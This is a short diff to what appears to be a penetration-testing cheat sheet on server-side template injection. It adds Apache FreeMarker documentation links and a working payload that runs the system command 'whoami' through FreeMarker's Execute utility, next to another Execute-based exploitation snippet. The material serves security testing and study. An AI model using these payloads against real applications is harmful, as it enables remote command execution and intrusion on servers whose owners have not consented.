@@ -79,6 +79,14 @@ Check for a response containing `49`. If yes, it's likely vulnerable.
 
 ## Apache FreeMarker
 
+```url
+https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html
+```
+
+```url
+https://freemarker.apache.org/docs/app_faq.html
+```
+
 **Language**: Java
 
 ### Detection
@@ -89,6 +97,10 @@ ${"freemarker"?api}  # See available methods
 ```
 
 ### Exploitation (Read files)
+
+```ftl
+${"freemarker.template.utility.Execute"?new()("whoami")}
+```
 
 ```ftl
 <#assign x = "freemarker.template.utility.Execute"?new()>
